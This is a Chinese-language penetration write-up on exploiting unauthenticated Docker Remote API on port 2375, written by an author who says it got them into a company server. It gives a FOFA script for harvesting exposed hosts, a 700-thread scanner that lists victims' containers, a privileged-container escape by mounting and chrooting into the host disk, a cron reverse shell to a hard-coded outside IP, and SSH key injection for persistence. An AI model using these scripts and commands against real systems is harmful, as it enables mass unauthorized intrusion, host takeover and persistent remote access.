
# [原创]docker-remoter-api渗透

## 漏洞简介及危害

`Docker`是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的`LINUX`机器上，也可以实现虚拟化。 `Docker swarm` 是一个将`docker`集群变成单一虚拟的`docker host`工具，使用标准的`Docker API`，能够方便`docker`集群的管理和扩展，由`docker`官方提供。

`Docker Remote API` 是一个取代远程命令行界面（`rcli`）的`REST API`。`Docker Remote API`如配置不当可导致未授权访问，攻击者利用 `docker client` 或者 `http` 直接请求就可以访问这个 `API`，可能导致敏感信息泄露，黑客也可以删除`Docker`上的数据。 攻击者可进一步利用`Docker`自身特性，直接访问宿主机上的敏感信息，或对敏感文件进行修改，最终完全控制服务器。

## 声明及前提

第一次挖洞，前天靠这个漏洞拿下了南京某大公司的一台服务器已获得`cnvd`编号，就写这篇文章记录分享下

本文仅供学习参考，如若保存下载后请在12小时内删除，不然后果自负。不得传播，商用以及利用文中技术进行非法活动，否则后果自负。严禁转载，否则一切后果自负。

<!--more-->

## 实战

直接`fofa`搜`docker` 协议 端口 `2375`的资产全爬下来 然后用脚本检测

### fofa爬取脚本

```python
#encoding=utf-8
import requests
import base64
import sys
email = r'xxx@qq.com'
api\_key = r'fofa\_api\_key'
api = r'https://fofa.info/api/v1/search/all?email={}&key={}&qbase64={}&size=10000'
arg = sys.argv[1]
print(arg)
flag = base64.b64encode(arg.encode()).decode()
response = requests.get(api.format(email,api\_key,flag))
results = response.json()["results"]
print("共搜索到{}条记录！".format(len(results)))
file\_name = r"{}.txt".format(arg)
f = open(file\_name,"a")
for addr in results:
    f.write(addr[0]+'\n')
f.close()
```

### 2375端口检测脚本

```python
# python3
# by 5wimming
import queue
import threading
import time
import requests
import json
import docker
thread\_lock = threading.Lock()
out\_result = [] # 输出列表
multi = 700 # 线程数量
queueSize = 800 # 申请队列空间大小,值一般略大于multi的值
input\_file\_path = "./port=2375.txt" # 输入文件路径，每个ip一行
output\_file\_path = './result.txt' #输出文件路径
ports = ['2375'] # 扫描端口
wait\_time = 5 # 文件线程准备时间(s)，默认1s，若需要读取的文件大小大于10M可增加至5s以上，文件越大设置的时间理论上越长
def read\_file():
    with open(input\_file\_path, 'r') as fp:
        file\_data = fp.readlines()
    data\_list = file\_data
    data\_length = len(data\_list)
    flag\_xy = 0
    while flag\_xy != data\_length:
        while (not workQueue.full()) and (flag\_xy != data\_length):
            workQueue.put(data\_list[flag\_xy])
            flag\_xy += 1
        continue
    print("文件内容放入队列完成")
def multi\_start\_main():
    while not workQueue.empty():
        file\_line\_api = workQueue.get()
        custom\_def(file\_line\_api)
def http\_get(url):
    response = requests.get(url)
    return response.text
def get\_version(host, port):
    url = "http://"+host+":"+port+"/version"
    ret = json.loads(http\_get(url))
    client\_api\_version = ret['ApiVersion']
    return client\_api\_version
def get\_container(host, port, docker\_version):
    cli = Client(base\_url='tcp://'+host+':'+port, version=docker\_version)
    return cli
def custom\_def(file\_line\_api):
    ip = file\_line\_api.strip()
    result = ''
    for port in ports:
        try:
            docker\_version = get\_version(ip, port)
            result = ip + '\t' + port + '\tversion:' + docker\_version
            docker\_containers = get\_container(ip, port, docker\_version)
            result += '\t' + str(docker\_containers.containers(all=True))
        except Exception as e:
            print(ip, e)
        if result:
            print('success:', result)
            with thread\_lock:
                out\_result.append(result)
            break
if \_\_name\_\_ == '\_\_main\_\_':
    threads = []
    workQueue = queue.Queue(queueSize)
    fileThread = threading.Thread(target=read\_file)
    fileThread.start()
    print("文件读取线程准备时间%ss" % wait\_time)
    time.sleep(wait\_time)
    for i in range(multi+1):
        thread = threading.Thread(target=multi\_start\_main)
        thread.start()
        threads.append(thread)
    for t in threads:
        t.join()
    fileThread.join()
    with open(output\_file\_path, 'w') as fw:
        fw.writelines(out\_result)
    print("主线程结束，任务完成")
```

### docker远程连接列出镜像目录

可以发现`2375`端口开启，并且是不需要授权访问的

![1648293475(1)](upload/attach/202203/921599\_TB5A3NY47WDH4ZK.jpg)

### docker逃逸

前提：靶机服务器需要能执行`docker run`指令

```bash
sudo docker run -itd --privileged=true ubuntu:latest /bin/bash
```

#### 逃逸指令

```
新建一个目录：mkdir /test
挂载磁盘到新建目录：mount /dev/vda1 /test
切换根目录：chroot /test
```

至此已经可以控制宿主机了，但是关于反弹`shell`以及写入自己的`ssh`密钥这个不一定可以直接操作，由于风险原因我不会进行反弹`shell`和`ssh`密钥写入，方法如下

```
写计划任务，反弹宿主机Shell。
echo '\* \* \* \* \* /bin/bash -i >& /dev/tcp/39.106.51.35/1234 0>&1' >> /test/var/spool/cron/crontabs/root
如果要写SSH的话，需要挂载宿主机的root目录到容器。
docker run -itd -v /root:/root ubuntu:18.04 /bin/bash
mkdir /root/.ssh
cat id\_rsa.pub >> /root/.ssh/authorized\_keys
然后ssh 私钥登录。
```

## 额外逃逸思路

如果上面的逃逸办法用不了，服务器上有用`docker`挂载`web`服务可以尝试进入容器上`webshell`变相拿下
